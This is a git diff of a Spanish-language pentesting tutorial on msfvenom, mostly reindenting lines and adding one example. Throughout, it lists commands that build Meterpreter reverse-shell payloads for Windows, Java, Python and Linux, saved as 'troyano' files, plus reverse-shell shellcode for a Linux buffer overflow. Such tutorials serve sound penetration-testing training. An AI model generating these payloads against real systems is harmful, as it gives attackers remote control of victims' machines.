@@ -30,7 +30,7 @@ msfvenom -h
 ```
 </b>
 
-    Si queremos disponer de un listado con los posibles opciones y/o payloads, podemos utilizar el siguientes códigos:
+Si queremos disponer de un listado con los posibles opciones y/o payloads, podemos utilizar el siguientes códigos:
 <b>
 
 ```
@@ -52,41 +52,40 @@ msfvenom -p [payload_elegido] LHOST=[ip_atacante] LPORT=[puerto_escucha_atacante
 ```
 </b>
 
-    Como es evidente, se pueden dar ocasiones en las que se deba crear un payload "a medida" para el sistema operativo que está en el host objetivo, siempre según los análisis que hemos realizado mediante NMAP.
-    Así, podemos crear diversos tipos de payloads:
+Como es evidente, se pueden dar ocasiones en las que se deba crear un payload "a medida" para el sistema operativo que está en el host objetivo, siempre según los análisis que hemos realizado mediante NMAP.
+Así, podemos crear diversos tipos de payloads:
 <b>
 
 ```
 # Para Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f exe > payload.exe
 ```
-
 ```
 # En Java
 msfvenom -p java/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -f jar > payload.jar
 ```
-
 ```
 # En python
 msfvenom -p python/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.py
 ```
-
 ```
 # Para Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
 ```
-
 ```
 # Para Linux
 msfvenom -p linux/meterpreter/reverse_tcp LHOST=[ip_atacante] LPORT=[puerto_atacante] -o troyano.exe
 ```
-
-
 ```
 # Buffer Overflow en Linux - Shellcode
 msfvenom -p linux/x86/shell_reverse_tcp lhost=[ip_atacante] lport=[puerto_atacante] --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
 ```
+</b>
 
+<b>Ejemplos de generación de un Meterpreter con MSFVenom:</b>
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform windows -a x64 -n 200 -e generic/none -i 4 -f exe -o reverse_shell.exe
 
 
 
